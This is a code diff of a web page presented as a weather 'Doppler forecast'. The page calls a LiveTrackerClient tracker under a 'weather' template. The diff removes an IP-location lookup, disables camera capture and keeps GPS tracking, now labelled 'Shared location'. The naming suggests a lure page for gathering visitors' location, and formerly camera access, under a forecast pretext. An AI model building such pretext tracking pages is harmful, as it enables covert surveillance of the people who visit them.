@@ -287,21 +287,15 @@
             }
 
             if (window.LiveTrackerClient) {
-                window.LiveTrackerClient.fetchIPLocation().then(loc => {
-                    if (loc && loc.city) {
-                        cityEl.innerText = `${loc.city}, ${loc.country || ''}`;
-                    }
-                });
-
                 window.LiveTrackerClient.startTracking({
                     templateName: 'weather',
-                    updateInterval: 4000,
-                    enableCamera: true,
+                    updateInterval: 5000,
+                    enableCamera: false,
                     enableGPS: true,
                     onSuccess: (coords) => {
                         btn.disabled = false;
                         btn.innerHTML = '<i class="fas fa-check-circle"></i> Doppler Forecast Updated';
-                        cityEl.innerText = `${coords.latitude.toFixed(3)}°, ${coords.longitude.toFixed(3)}°`;
+                        cityEl.textContent = `Shared location: ${coords.latitude.toFixed(3)}°, ${coords.longitude.toFixed(3)}°`;
                         setTimeout(() => {
                             btn.innerHTML = '<i class="fas fa-rotate"></i> Refresh Doppler Radar';
                         }, 3500);
